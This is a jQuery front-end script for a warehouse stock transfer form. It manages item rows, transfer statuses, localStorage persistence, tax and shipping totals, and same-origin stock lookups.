page_mode = $('#page_mode').val();
permission_owner = $('#permission_owner').val();
permission_admin = $('#permission_admin').val();
sent_edit_transfer = $('#sent_edit_transfer').val();
ReadonlyData = 0;
if (permission_admin == 1)
    ReadonlyData = 1;
if (permission_owner == 1)
    ReadonlyData = 1;
$(document).ready(function () {
    $('body a, body button').attr('tabindex', -1);
    check_add_item_val();
    if (site.settings.set_focus != 1) {
        $('#add_item').focus();
    }
// Order level shipping and discoutn localStorage 
    $('#tostatus').change(function (e) {
        localStorage.setItem('tostatus', $(this).val());
        var Tostatus = $(this).val();

        if (Tostatus == 'request') {
            $('.request_quantity').attr("readonly", false);
            $('.main_quantity').attr("readonly", true);
        } else {
            $('.request_quantity').attr("readonly", true);
            $('.main_quantity').attr("readonly", false);
        }
        if (sent_edit_transfer == 1 && Tostatus == 'completed') {
            $('.rquantity').attr("readonly", true);
            $('#add_item').attr("readonly", true);
        }
        if (Tostatus == 'partial_completed') {
            changeStatus();
        }
        if (Tostatus == 'sent_balance') {
            changeStatus();
        }
        if (page_mode == 'edit') {
            //	$('.rquantity').attr("readonly", true);
            /*if(Tostatus == 'partial') {
             if(ReadonlyData!=1){
             $('.rquantity').attr("readonly", false);
             }else{
             $('.rquantity').attr("readonly", false);
             }
             }*/
            $('.rqty_zero').attr("readonly", true);
        }

        onChangeStatus();

    });



    function onChangeStatus() {

        var Tostatus = $('#tostatus').val();

        $.each(sortedItems, function () {
            var item = this;

            var base_quantity = item.row.base_quantity;
            var quantity = item.row.quantity;
            var item_oqty = item.row.ordered_quantity;
            var item_bqty = item.row.quantity_balance;
            var item_aqty = item.row.quantity;
            var item_option = item.row.option;

            var itemId = item.item_id;
            var row_no = $('#row_no_' + itemId).val();

            if ((item.status != 'sent' && item.status != 'completed')) {
                if (item.options !== false) {
                    $.each(item.options, function () {
                        if (this.id == item_option && parseFloat(base_quantity) > parseFloat(this.quantity)) {

                            $('#row_' + row_no).addClass('danger a');

                            if (Tostatus == 'request') {
                                $('#edit_transfer').attr('disabled', false);
                            } else {
                                $('#edit_transfer').attr('disabled', true);
                            }

                            if (Tostatus == 'completed') {
                                var aaqty = parseFloat(quantity) + parseFloat(item_oqty);

                                if (parseFloat(base_quantity) > parseFloat(aaqty)) {
                                    $('#edit_transfer').attr('disabled', true);
                                }
                            }
                        }
                    });
                } else if (parseFloat(base_quantity) > parseFloat(item_aqty)) {
                    $('#row_' + row_no).addClass('danger');
                    if (Tostatus == 'request') {
                        $('#edit_transfer').attr('disabled', false);
                    } else {
                        $('#edit_transfer').attr('disabled', true);
                    }
                    //$('#add_transfer').attr('disabled', true);
                    if (Tostatus == 'completed') {
                        var aaqty = parseFloat(item_aqty) + parseFloat(item_bqty);

                        if (parseFloat(base_quantity) > parseFloat(aaqty)) {
                            $('#edit_transfer').attr('disabled', true);
                        }
                    }
                }
            }

        });
    }


    function changeStatus() {
        var Tostatus = localStorage.getItem('tostatus');
        if (Tostatus == 'partial_completed') {
            $.each(toitems, function (k, v) {
                var new_qty = toitems[k].row.sent_quantity;
                toitems[k].row.base_quantity = new_qty;
                /*if(toitems[k].row.unit != toitems[k].row.base_unit) {
                 $.each(toitems[k].units, function(){
                 if (this.id == toitems[k].row.unit) {
                 toitems[k].row.base_quantity = unitToBaseQty(new_qty, this);
                 }
                 });
                 }*/
                toitems[k].row.qty = new_qty;
            });
        }
        if (Tostatus == 'sent_balance') {
            $.each(toitems, function (k, v) {
                var new_qty = parseFloat(toitems[k].row.request_quantity) - parseFloat(toitems[k].row.sent_quantity);
                toitems[k].row.base_quantity = new_qty;
                toitems[k].row.qty = new_qty;
            });
        }
        //console.log(JSON.stringify(toitems));
        localStorage.setItem('toitems', JSON.stringify(toitems));
        loadItems();
    }
    if (tostatus = localStorage.getItem('tostatus')) {
        $('#tostatus').select2("val", tostatus);

        if (tostatus == 'completed') {
            $('#tostatus').select2("readonly", true);
            if (page_mode == 'edit') {
                //alert(permission_owner)
                $('#from_warehouse').select2("readonly", true);
                $('#to_warehouse').select2("readonly", true);
                $('#display_product').select2("readonly", true);
                //$('#add_item').attr("readonly", true);
                $('.rexpiry').attr("readonly", true);
                //$('.rquantity').attr("readonly", true);
                $('.tointer').hide();
            }
        }
    }
    if (page_mode == 'edit') {
        $('#from_warehouse').select2("readonly", true);
        $('#to_warehouse').select2("readonly", true);
        if (ReadonlyData != 1) {
            //alert(permission_owner)
            $('#from_warehouse').select2("readonly", true);
            $('#to_warehouse').select2("readonly", true);
            $('#display_product').select2("readonly", true);
            //$('#add_item').attr("readonly", true);
            $('.rexpiry').attr("readonly", true);
            //$('.rquantity').attr("readonly", true);
            $('.tointer').hide();
        }

    }
    var old_shipping;
    $('#toshipping').focus(function () {
        old_shipping = $(this).val();
    }).change(function () {
        /*if (!is_numeric($(this).val())) {
         $(this).val(old_shipping);
         bootbox.alert(lang.unexpected_value);
         return;
         } else {
         shipping = $(this).val() ? parseFloat($(this).val()) : '0';
         }
         localStorage.setItem('toshipping', shipping);*/
        if ($(this).val() != '') {
            if (!is_numeric($(this).val())) {
                $(this).val(old_shipping);
                bootbox.alert(lang.unexpected_value);
                return;
            } else {
                shipping = $(this).val() ? parseFloat($(this).val()) : '0';
            }
            localStorage.setItem('toshipping', shipping);
        } else {

            var shipping = 0;
            localStorage.removeItem('toshipping');
        }

        var gtotal;
        var display_product = $('#display_product').val();
        if (display_product == 'warehouse_product') {
            total1 = parseFloat($('#total_warProduct').val());
            gtotal = total1 + shipping;
            $('#total').text(formatMoney(total1));
        }

        if (display_product == 'search_product') {
            gtotal = total + shipping;
            $('#total').text(formatMoney(total));
        }

        //var gtotal = total  + shipping;
        $('#gtotal').text(formatMoney(gtotal));

        $('#tship').text(formatMoney(shipping));
        $('#tship_In').val(shipping);
    });
    if (toshipping = localStorage.getItem('toshipping')) {
        shipping = parseFloat(toshipping);
        $('#toshipping').val(shipping);

    }
//localStorage.clear();
// If there is any item in localStorage
    if (localStorage.getItem('toitems')) {
        loadItems();
    }

    // clear localStorage and reload
    $('#reset').click(function (e) {
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result) {
                if (localStorage.getItem('toitems')) {
                    localStorage.removeItem('toitems');
                }
                if (localStorage.getItem('toshipping')) {
                    localStorage.removeItem('toshipping');
                }
                if (localStorage.getItem('toref')) {
                    localStorage.removeItem('toref');
                }
                if (localStorage.getItem('to_warehouse')) {
                    localStorage.removeItem('to_warehouse');
                }
                if (localStorage.getItem('tonote')) {
                    localStorage.removeItem('tonote');
                }
                if (localStorage.getItem('from_warehouse')) {
                    localStorage.removeItem('from_warehouse');
                }
                if (localStorage.getItem('todate')) {
                    localStorage.removeItem('todate');
                }
                if (localStorage.getItem('tostatus')) {
                    localStorage.removeItem('tostatus');
                }

                $('#modal-loading').show();
                location.reload();
            }
        });
    });

// save and load the fields in and/or from localStorage

    $('#toref').change(function (e) {
        localStorage.setItem('toref', $(this).val());
    });
    if (toref = localStorage.getItem('toref')) {
        $('#toref').val(toref);
    }
    $('#to_warehouse').change(function (e) {
        localStorage.setItem('to_warehouse', $(this).val());
    });
    if (to_warehouse = localStorage.getItem('to_warehouse')) {
        $('#to_warehouse').select2("val", to_warehouse);
    }
    $('#from_warehouse').change(function (e) {
        localStorage.setItem('from_warehouse', $(this).val());
    });
    if (from_warehouse = localStorage.getItem('from_warehouse')) {
        $('#from_warehouse').select2("val", from_warehouse);
        if (count > 1) {
            //$('#from_warehouse').select2("readonly", true);
        }
    }

    //$(document).on('change', '#tonote', function (e) {
    $('#tonote').redactor('destroy');
    $('#tonote').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var v = this.get();
            localStorage.setItem('tonote', v);
        }
    });
    if (tonote = localStorage.getItem('tonote')) {
        $('#tonote').redactor('set', tonote);
    }

    $(document).on('change', '.rexpiry', function () {
        var item_id = $(this).closest('tr').attr('data-item-id');
        toitems[item_id].row.expiry = $(this).val();
        localStorage.setItem('toitems', JSON.stringify(toitems));
    });


// prevent default action upon enter
    $('body').bind('keypress', function (e) {
        if ($(e.target).hasClass('redactor_editor')) {
            return true;
        }
        if (e.keyCode == 13) {
            e.preventDefault();
            return false;
        }
    });


    /* ---------------------- 
     * Delete Row Method 
     * ---------------------- */

    $(document).on('click', '.todel', function () {
        var row = $(this).closest('tr');
        var item_id = row.attr('data-item-id');
        delete toitems[item_id];
        row.remove();
        if (toitems.hasOwnProperty(item_id)) {
        } else {
            localStorage.setItem('toitems', JSON.stringify(toitems));
            loadItems();
            return;
        }
    });

    /* --------------------------
     * Edit Row Quantity Method 
     -------------------------- */
    var old_row_qty;
    $(document).on("focus", '.rquantity', function () {
        old_row_qty = $(this).val();
    }).on("change", '.rquantity', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val()) || parseFloat($(this).val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        console.log(row);
        var new_qty = parseFloat($(this).val()),
                item_id = row.attr('data-item-id');

        toitems[item_id].row.base_quantity = new_qty;
        if (toitems[item_id].row.unit != toitems[item_id].row.base_unit) {
            $.each(toitems[item_id].units, function () {
                if (this.id == toitems[item_id].row.unit) {
                    toitems[item_id].row.base_quantity = unitToBaseQty(new_qty, this);
                }
            });
        }
        toitems[item_id].row.qty = new_qty;
        var Tostatus = $('#tostatus').val();
        if (Tostatus == 'request') {
            toitems[item_id].row.request_quantity = new_qty;
        }
        //console.log(JSON.stringify(toitems));
        localStorage.setItem('toitems', JSON.stringify(toitems));
        loadItems();
    });

    /* --------------------------
     * Edit Row Cost Method 
     -------------------------- */
    var old_cost;
    $(document).on("focus", '.rcost', function () {
        old_cost = $(this).val();
    }).on("change", '.rcost', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val())) {
            $(this).val(old_cost);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_cost = parseFloat($(this).val()),
                item_id = row.attr('data-item-id');
        toitems[item_id].row.cost = new_cost;
        localStorage.setItem('toitems', JSON.stringify(toitems));
        loadItems();
    });

    $(document).on("click", '#removeReadonly', function () {
        $('#from_warehouse').select2('readonly', false);
        return false;
    });


});

/* -----------------------
 * Edit Row Modal Hanlder 
 ----------------------- */
$(document).on('click', '.edit', function () {
    $('#prModal').appendTo("body").modal('show');
    if ($('#poption').select2('val') != '') {
        $('#poption').select2('val', product_variant);
        product_variant = 0;
    }

    var row = $(this).closest('tr');
    var row_id = row.attr('id');
    item_id = row.attr('data-item-id');
    item = toitems[item_id];
    var qty = row.children().children('.rquantity').val(),
            product_option = row.children().children('.roption').val(),
            cost = row.children().children('.rucost').val();
    $('#prModalLabel').text(item.row.name + ' (' + item.row.code + ')');
    if (site.settings.tax1) {
        var tax = item.tax_rate != 0 ? item.tax_rate.name + ' (' + item.tax_rate.rate + ')' : 'N/A';
        $('#ptax').text(tax);
        $('#old_tax').val($('#sproduct_tax_' + row_id).text());
    }

    var opt = '<p style="margin: 12px 0 0 0;">n/a</p>';
    if (item.options !== false) {
        var o = 1;
        opt = $("<select id=\"poption\" name=\"poption\" class=\"form-control select\" />");
        $.each(item.options, function () {
            if (o == 1) {
                if (product_option == '') {
                    product_variant = this.id;
                } else {
                    product_variant = product_option;
                }
            }
            $("<option />", {value: this.id, text: this.name}).appendTo(opt);
            o++;
        });
    }
    uopt = $("<select id=\"punit\" name=\"punit\" class=\"form-control select\" />");
    $.each(item.units, function () {
        if (this.id == item.row.unit) {
            $("<option />", {value: this.id, text: this.name, selected: true}).appendTo(uopt);
        } else {
            $("<option />", {value: this.id, text: this.name}).appendTo(uopt);
        }
    });
    $('#poptions-div').html(opt);
    $('#punits-div').html(uopt);
    //$('select.select').select2({minimumResultsForSearch: 7});
    $('#pquantity').val(qty);
    $('#old_qty').val(qty);
    $('#pprice').val(cost);
    //$('#poption').select2('val', item.row.option);
    $('#poption').val(item.row.option);
    $('#old_price').val(cost);
    $('#row_id').val(row_id);
    $('#item_id').val(item_id);
    $('#pserial').val(row.children().children('.rserial').val());
    $('#pproduct_tax').select2('val', row.children().children('.rproduct_tax').val());
    $('#pdiscount').val(row.children().children('.rdiscount').val());


});

/*$('#prModal').on('shown.bs.modal', function (e) {
 if($('#poption').select2('val') != '') {
 $('#poption').select2('val', product_variant);
 product_variant = 0;
 }
 });*/

$(document).on('change', '#punit', function () {
    var row = $('#' + $('#row_id').val());
    var item_id = row.attr('data-item-id');
    var item = toitems[item_id];
    if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
        $(this).val(old_row_qty);
        bootbox.alert(lang.unexpected_value);
        return;
    }
    var unit = $('#punit').val();
    if (unit != toitems[item_id].row.base_unit) {
        $.each(item.units, function () {
            if (this.id == unit) {
                $('#pprice').val(formatDecimal((parseFloat(item.row.base_unit_cost) * (unitToBaseQty(1, this))), 4)).change();
            }
        });
    } else {
        $('#pprice').val(formatDecimal(item.row.base_unit_cost)).change();
    }
});

/*7-09-2019*/
$(document).on('change', '#poption', function () {
    var qtyw1 = 0;
    var qtyw2 = 0;
    var vartient = $('#poption').val();

    var from_warehouse = (localStorage.getItem('from_warehouse') == null) ? $('#from_warehouse').val() : localStorage.getItem('from_warehouse');
    var to_warehouse = (localStorage.getItem('to_warehouse') == null) ? $('#to_warehouse').val() : localStorage.getItem('to_warehouse');
    var base_path = window.location.pathname;
    var geturl_path = base_path.split("/");
    var url_pass = window.location.origin + '/' + geturl_path[1] + '/getQuantity';
    $.ajax({
        type: 'ajax',
        dataType: 'json',
        method: 'Get',
        data: {'from_warehouse': from_warehouse, 'to_warehouse': to_warehouse, 'vartient': vartient},
        url: url_pass,
        async: false,
        success: function (data) {
            if (data[0]) {
                qtyw1 = parseFloat(data[0]['quantity']);
            }
            if (data[1]) {
                qtyw2 = parseFloat(data[1]['quantity']);
            }
            $('#warh1qty').val(qtyw1);
            $('#warh2qty').val(qtyw2);
        }
    });
});


/**/


/* -----------------------
 * Edit Row Method 
 ----------------------- */
$(document).on('click', '#editItem', function () {
    var row = $('#' + $('#row_id').val());
    var item_id = row.attr('data-item-id');
    if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
        $(this).val(old_row_qty);
        bootbox.alert(lang.unexpected_value);
        return;
    }
    var unit = $('#punit').val();
    var base_quantity = parseFloat($('#pquantity').val());
    if (unit != toitems[item_id].row.base_unit) {
        $.each(toitems[item_id].units, function () {
            if (this.id == unit) {
                base_quantity = unitToBaseQty($('#pquantity').val(), this);
            }
        });
    }

    if ($('#warh1qty').val() == '' && $('#warh2qty').val() == '') {
        toitems[item_id].row.fup = 1,
                toitems[item_id].row.qty = parseFloat($('#pquantity').val()),
                toitems[item_id].row.base_quantity = parseFloat(base_quantity),
                toitems[item_id].row.unit = unit,
                toitems[item_id].row.real_unit_cost = parseFloat($('#pprice').val()),
                toitems[item_id].row.cost = parseFloat($('#pprice').val()),
                // toitems[item_id].row.tax_rate = new_pr_tax_rate,
                toitems[item_id].row.discount = $('#pdiscount').val(),
                toitems[item_id].row.option = $('#poption').val(),
                localStorage.setItem('toitems', JSON.stringify(toitems));
    } else {
        toitems[item_id].row.fup = 1,
                toitems[item_id].row.quantity = parseFloat($('#warh1qty').val()),
                toitems[item_id].row.getstock_2 = parseFloat($('#warh2qty').val()),
                toitems[item_id].row.qty = parseFloat($('#pquantity').val()),
                toitems[item_id].row.base_quantity = parseFloat(base_quantity),
                toitems[item_id].row.unit = unit,
                toitems[item_id].row.real_unit_cost = parseFloat($('#pprice').val()),
                toitems[item_id].row.cost = parseFloat($('#pprice').val()),
                // toitems[item_id].row.tax_rate = new_pr_tax_rate,
                toitems[item_id].row.discount = $('#pdiscount').val(),
                toitems[item_id].row.option = $('#poption').val(),
                localStorage.setItem('toitems', JSON.stringify(toitems));
    }

    $('#prModal').modal('hide');

    loadItems();
    return;
});

/* -----------------------
 * Misc Actions
 ----------------------- */

function loadItems() {

    var warehouse2 = (localStorage.getItem('to_warehouse') == null) ? $('#to_warehouse').val() : localStorage.getItem('to_warehouse');
    var Tostatus = $('#tostatus').val();
    if (localStorage.getItem('toitems')) {
        total = 0;
        count = 1;
        an = 1;
        product_tax = 0;
        $("#toTable tbody").empty();
        $('#add_transfer, #edit_transfer').attr('disabled', false);
        toitems = JSON.parse(localStorage.getItem('toitems'));
        //sortedItems = (site.settings.item_addition == 1) ? _.sortBy(toitems, function(o){return [parseInt(o.order)];}) :   toitems;
        sortedItems = _.sortBy(toitems, function (o) {
            return [parseInt(o.order)];
        });
        var order_no = new Date().getTime();
        var isRequestPrd = false;
        console.log('-----------sortedItems-----------');
        console.log(sortedItems);

        $.each(sortedItems, function () {
            var item = this;

            //var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
            var item_id = item.item_id;
            if (item.option_id) {
                item_id = item.item_id + item.option_id;
            }

            item.order = item.order ? item.order : order_no++;
            var from_warehouse = localStorage.getItem('from_warehouse'), check = false;
            var product_id = item.row.id, item_type = item.row.type, item_cost = item.row.cost, item_qty = item.row.qty, item_bqty = item.row.quantity_balance, item_oqty = item.row.ordered_quantity, item_expiry = item.row.expiry, item_aqty = item.row.quantity, item_tax_method = item.row.tax_method, item_ds = item.row.discount, item_discount = 0, item_option = item.row.option, item_code = item.row.code, item_serial = item.row.serial, item_name = item.row.name.replace(/"/g, "&#034;").replace(/'/g, "&#039;");

            var unit_cost = item.row.real_unit_cost;
            var product_unit = item.row.unit, base_quantity = item.row.base_quantity;
            var quantity = item.row.quantity;
            // var getstock_2= item.row.getstock_2;
            var pr_tax = item.tax_rate;
            var pr_tax_val = 0, pr_tax_rate = 0;

            // Get Stock 2 Warehouse
            var getstock_2 = '0';
            getstock_2 = item.row.stockwarehouse2;
            /* var base_path = window.location.pathname;
             var geturl_path = base_path.split("/");
             var url_pass = window.location.origin+'/'+geturl_path[1]+'/getstockwarehouse';
             //console.log(base_path);
             //console.log(geturl_path);
             // console.log(url_pass);
             //var getstock_2='0';
             $.ajax({
             type:'ajax',
             dataType:'json',
             method:'Get',
             data:{'warehouse2': warehouse2, 'product':item.item_id,'vartient':item_option},
             url:url_pass,
             async:false,
             success:function(result){
             
             getstock_2 = (result==null)?'0':result;
             
             },error:function(){
             console.log('error');
             }
             
             
             });*/

            // End Get Second Warehouse Stock

            if (site.settings.tax1 == 1) {
                if (pr_tax !== false) {
                    if (pr_tax.type == 1) {

                        if (item_tax_method == '0') {
                            pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax.rate)) / (100 + parseFloat(pr_tax.rate)), 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        } else {
                            pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax.rate)) / 100, 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        }

                    } else if (pr_tax.type == 2) {
                        pr_tax_val = parseFloat(pr_tax.rate);
                        pr_tax_rate = pr_tax.rate;
                    }
                    product_tax += pr_tax_val * item_qty;
                }
            }
            item_cost = item_tax_method == 0 ? formatDecimal(unit_cost - pr_tax_val, 4) : formatDecimal(unit_cost);
            unit_cost = formatDecimal(unit_cost + item_discount, 4);
            var sel_opt = '';
            $.each(item.options, function () {
                if (this.id == item_option) {
                    sel_opt = this.name;
                }
            });

            var row_no = (new Date).getTime();
            var newTr = $('<tr id="row_' + row_no + '" class="row_' + item_id + ' each_tr" data-item-id="' + item_id + '"></tr>');
            tr_html = '<td><input name="product_id[]" type="hidden" class="rid" value="' + product_id + '"><input name="product_type[]" type="hidden" class="rtype" value="' + item_type + '"><input name="product_code[]" type="hidden" class="rcode" value="' + item_code + '"><input name="product_name[]" type="hidden" class="rname" value="' + item_name + '"><input type="hidden" id="PrItemId_' + row_no + '" value="' + item.item_id + '"><input name="product_option[]" type="hidden" class="roption" id="ItemOption_' + row_no + '" value="' + item_option + '"><span class="sname" id="name_' + row_no + '">' + item_code + ' - ' + item_name + (sel_opt != '' ? ' (' + sel_opt + ')' : '') + '</span> <i class="pull-right fa fa-edit tip tointer edit" id="' + row_no + '" data-item="' + item_id + '" title="Edit" style="cursor:pointer;"></i></td>';
            tr_html += '<td class="text-right">' + formatDecimal(quantity) + '</td>';
            tr_html += '<td  class="text-right stock_2_' + row_no + '">' + formatDecimal(getstock_2) + '</td>';
            if (site.settings.product_expiry == 1) {
                tr_html += '<td><input class="form-control date rexpiry" name="expiry[]" type="text" value="' + item_expiry + '" data-id="' + row_no + '" data-item="' + item_id + '" id="expiry_' + row_no + '"></td>';
            }
            tr_html += '<td class="text-right"><input class="form-control input-sm text-right rcost" name="net_cost[]" type="hidden" id="cost_' + row_no + '" value="' + formatDecimal(item_cost) + '"><input class="rucost" name="unit_cost[]" type="hidden" value="' + unit_cost + '"><input class="realucost" name="real_unit_cost[]" type="hidden" value="' + item.row.real_unit_cost + '"><span class="text-right scost" id="scost_' + row_no + '">' + formatMoney(item_cost) + '</span></td>';

            if (item.row.request_quantity != null || item.row.request_quantity != 0) {
                isRequestPrd = true;
            }

            if (isRequestPrd === true) {
//                tr_html += '<td class="text-right">' + formatDecimal(item.row.request_quantity) + '</td>';
//                tr_html += '<td class="text-right"> ' + formatDecimal(item.row.sent_quantity) + '</td>';
            }

            // 2/04/19
            var requestTextQty = '';
            if (status == 'request' || status == 'partial' || status == 'partial_completed' || status == 'sent_balance') {
                if (item.row.request_quantity == item.row.sent_quantity) {
                    requestTextQty = '<input type="hidden" name="request_quantity[]"  value="' + formatDecimal(item.row.request_quantity) + '" />';
                    $('.extracloumn').hide();
                } else {
                    var OrgSentQty = '';
                    if (status == 'sent_balance')
                        OrgSentQty = '(' + formatDecimal(item.row.PrQtyBallance) + ')';
                    tr_html += '<td class="text-right"><input type="text" name="request_quantity[]" ' + ((Tostatus != "request") ? "readonly" : "") + ' class="form-control rquantity request_quantity" value="' + formatDecimal(item.row.request_quantity) + '" /></td>';
                    tr_html += '<td class="text-right"> ' + formatDecimal(item.row.sent_quantity) + OrgSentQty + '</td>';
                }
            } else {
                if (status == 'sent') {
                    if (item.row.request_quantity != 0) {
                        if (item.row.request_quantity != null) {
                            tr_html += '<td class="text-right"><input type="text" name="request_quantity[]" ' + ((Tostatus != "request") ? "readonly" : "") + ' class="form-control rquantity request_quantity" value="' + formatDecimal(item.row.request_quantity) + '" /></td>';
                            tr_html += '<td class="text-right"> ' + formatDecimal(item.row.sent_quantity) + '</td>';
                            $('.extracloumn').show();
                        } else {
                            $('.extracloumn').hide();
                            requestTextQty = '<input type="hidden" name="request_quantity[]"  value="' + formatDecimal(item.row.request_quantity) + '" />';
                        }

                    } else {
                        $('.extracloumn').hide();
                        requestTextQty = '<input type="hidden" name="request_quantity[]"  value="' + formatDecimal(item.row.request_quantity) + '" />';
                    }

                } else {
                    requestTextQty = '<input type="hidden" name="request_quantity[]"  value="' + formatDecimal(item.row.request_quantity) + '" />';
                }
            }

            // tr_html += td_request_quantity + '' + td_request_quantity;

            // End  2/04/19
            var rqty = '';
            //console.log(item.row.request_quantity+' '+item.row.sent_quantity);
            if (item_qty == 0)
                rqty = 'rqty_zero';
            tr_html += '<td> ' + requestTextQty + '<input type="hidden" name="sent_quantity[]" value="' + formatDecimal(item.row.sent_quantity) + '"/>' +
                    '<input name="quantity_balance[]" type="hidden" class="rbqty" value="' + formatDecimal(item_bqty, 4) + '">' +
                    '<input name="ordered_quantity[]" type="hidden" class="roqty" value="' + formatDecimal(item_oqty, 4) + '">' +
                    '<input ' + ((Tostatus == "request") ? "readonly" : "") + ' class="form-control text-center rquantity main_quantity ' + rqty + '" tabindex="' + ((site.settings.set_focus == 1) ? an : (an + 1)) + '" name="quantity[]" type="text" value="' + formatDecimal(item_qty) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_' + row_no + '" onClick="this.select();">' +
                    '<input name="product_unit[]" type="hidden" class="runit" value="' + product_unit + '">' +
                    '<input name="product_base_quantity[]" type="hidden" class="rbase_quantity" value="' + base_quantity + '"></td>';



            if (site.settings.tax1 == 1) {
                tr_html += '<td class="text-right"><input class="form-control input-sm text-right rproduct_tax" name="product_tax[]" type="hidden" id="product_tax_' + row_no + '" value="' + pr_tax.id + '"><span class="text-right sproduct_tax" id="sproduct_tax_' + row_no + '">' + (pr_tax_rate ? '(' + pr_tax_rate + ')' : '') + ' ' + formatMoney(pr_tax_val * item_qty) + '</span></td>';
            }

            tr_html += '<td class="text-right"><span class="text-right ssubtotal" id="subtotal_' + row_no + '">' + formatMoney(((parseFloat(item_cost) - item_discount + parseFloat(pr_tax_val)) * parseFloat(item_qty))) + '</span></td>';
            tr_html += '<td class="text-center"><i class="fa fa-times tip todel" id="' + row_no + '" title="Remove" style="cursor:pointer;"></i></td>';
            newTr.html(tr_html);
            newTr.prependTo("#toTable");
            total += formatDecimal(((parseFloat(item_cost) + parseFloat(pr_tax_val)) * parseFloat(item_qty)), 4);
            count += parseFloat(item_qty);
            an++;

            if (item.status != 'sent' && item.status != 'completed') {

                if (item.options !== false) {
                    $.each(item.options, function () {
                        if (this.id == item_option && parseFloat(base_quantity) > parseFloat(this.quantity)) {
                            $('#row_' + row_no).addClass('danger');
                            $('#add_transfer, #edit_transfer').attr('disabled', true);
                            // $('#add_transfer').attr('disabled', true); 
                            if (Tostatus == 'completed') {
                                var aaqty = parseFloat(quantity) + parseFloat(item_oqty);
                                //console.log(base_quantity+'>'+aaqty+' '+this.quantity);
                                if (parseFloat(base_quantity) > parseFloat(aaqty)) {
                                    $('#edit_transfer').attr('disabled', true);
                                }
                            }
                        }
                    });
                } else if (parseFloat(base_quantity) > parseFloat(item_aqty)) {
                    $('#row_' + row_no).addClass('danger');
                    $('#add_transfer, #edit_transfer').attr('disabled', true);

                    if (Tostatus == 'completed') {
                        var aaqty = parseFloat(item_aqty) + parseFloat(item_bqty);

                        if (parseFloat(base_quantity) > parseFloat(aaqty)) {
                            $('#edit_transfer').attr('disabled', true);
                        }
                    }
                }
            } else {
                $('#edit_transfer').attr('disabled', false);
            }

        });

        var col = 4;
        if (site.settings.product_expiry == 1) {
            col++;
        }
        var tfoot = '<tr id="tfoot" class="tfoot active"><th colspan="' + col + '">Total</th><th class="text-center">' + formatNumber(parseFloat(count) - 1) + '</th>';
        if (site.settings.tax1 == 1) {
            tfoot += '<th class="text-right">' + formatMoney(product_tax) + '</th>';
        }
        tfoot += '<th class="text-right">' + formatMoney(total) + '</th><th class="text-center"><i class="fa fa-trash-o" style="opacity:0.5; filter:alpha(opacity=50);"></i></th></tr>';
        $('#toTable tfoot').html(tfoot);

        // Totals calculations after item addition

        var shipping = ($('#toshipping').val() != '') ? parseFloat($('#toshipping').val()) : 0;
        var gtotal = total + shipping;
        $('#tship').text(formatMoney(shipping));
        $('#total').text(formatMoney(total));
        $('#titems').text((an - 1) + ' (' + (parseFloat(count) - 1) + ')');
        if (site.settings.tax1) {
            $('#ttax1').text(formatMoney(product_tax));
        }
        $('#gtotal').text(formatMoney(gtotal));
        if (an > parseInt(site.settings.bc_fix) && parseInt(site.settings.bc_fix) > 0) {
            $("html, body").animate({scrollTop: $('#sticker').offset().top}, 500);
            $(window).scrollTop($(window).scrollTop() + 1);
        }
        set_page_focus();
        if (tostatus == 'completed') {
            $('#tostatus').select2("readonly", true);
            if (page_mode == 'edit') {
                //alert(permission_owner)
                $('.rexpiry').attr("readonly", true);
                //$('.rquantity').attr("readonly", true);
                $('.tointer').hide();
            }
        }
        if (page_mode == 'edit') {
            //$('.rquantity').attr("readonly", true);
            if (ReadonlyData != 1) {
                //alert(permission_owner)
                $('.rexpiry').attr("readonly", true);
                //$('.rquantity').attr("readonly", true);
                $('.tointer').hide();
            }
        }
        if (tostatus == 'partial') {
            if (page_mode == 'edit') {
                if (ReadonlyData != 1) {
                    //$('.rquantity').attr("readonly", false);
                }
            }
        }
        var ttstatus = $('#tostatus').val();
        if (ttstatus == 'partial') {
            if (page_mode == 'edit') {
                //console.log(ReadonlyData);
                if (ReadonlyData == 1) {
                    //$('.rquantity').attr("readonly", false);
                }
            }
        }
        //$('.rqty_zero').attr("readonly", true);

        if (sent_edit_transfer == 1) {
            $('.rquantity').attr("readonly", true);
            $('#add_item').attr("readonly", true);
        }
        if (ttstatus == 'partial_completed') {
            $('.rquantity').attr("readonly", true);
            $('#add_item').attr("readonly", true);
        }

        if (Tostatus == 'request') {
            $('#edit_transfer').attr('disabled', false);
        }
    }
}

/* -----------------------------
 * Add Purchase Iten Function
 * @param {json} item
 * @returns {Boolean}
 ---------------------------- */
function add_transfer_item(item) {
    if (item.row.quantity < 1) {
        bootbox.alert('The product is out of stock and cannot be added to transfer');
    }
    if (count == 1) {
        toitems = {};
        if ($('#from_warehouse').val()) {
            //  $('#from_warehouse').select2("readonly", true);
        } else {
            bootbox.alert(lang.select_above);
            item = null;
            return;
        }
    }
    if (item == null)
        return;

    //var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
    var item_id = item.item_id;
    if (item.option_id != 0)
        item_id = item.item_id + item.option_id;

    if (toitems[item_id]) {
        toitems[item_id].row.qty = parseFloat(toitems[item_id].row.qty) + 1;
        var bsqty = parseFloat(toitems[item_id].row.base_quantity) + 1;
        toitems[item_id].row.base_quantity = unitToBaseQty(bsqty, this);
    } else {
        toitems[item_id] = item;
    }
    toitems[item_id].order = new Date().getTime();
    localStorage.setItem('toitems', JSON.stringify(toitems));
    loadItems();
    return true;
}

if (typeof (Storage) === "undefined") {
    $(window).bind('beforeunload', function (e) {
        if (count > 1) {
            var message = "You will loss data!";
            return message;
        }
    });
